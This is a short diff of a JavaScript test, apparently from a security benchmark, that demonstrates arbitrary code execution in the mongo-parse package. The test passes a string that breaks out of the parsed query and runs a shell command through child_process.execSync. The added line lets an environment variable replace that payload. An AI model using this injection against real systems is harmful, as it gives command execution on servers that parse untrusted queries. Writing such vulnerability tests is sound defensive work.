@@ -16,7 +16,7 @@ test("Arbitrary code execution in mongo-parse", (done) => {
   
   try {
     let query = parser.parse(
-      '} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync("touch mongo-parse") //'
+      process.env.SECBENCH_PAYLOAD || ('} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync("touch mongo-parse") //')
     );
   } catch (error) {console.log(error)}
   
